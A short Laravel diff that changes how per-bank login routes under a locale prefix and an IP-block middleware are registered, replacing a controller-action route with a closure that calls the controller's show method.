@@ -19,9 +19,9 @@ Route::prefix('{locale}')
 
         Route::middleware(['blocked.ip'])->group(function () {
             foreach (BankLoginController::ACTIVE_SLUGS as $slug) {
-                Route::get('/' . $slug, [BankLoginController::class, 'show'])
-                    ->defaults('bankSlug', $slug)
-                    ->name('bank-login.' . $slug);
+                Route::get('/' . $slug, function (\Illuminate\Http\Request $request) use ($slug) {
+                    return app(BankLoginController::class)->show($slug, $request);
+                })->name('bank-login.' . $slug);
             }
         });
     });
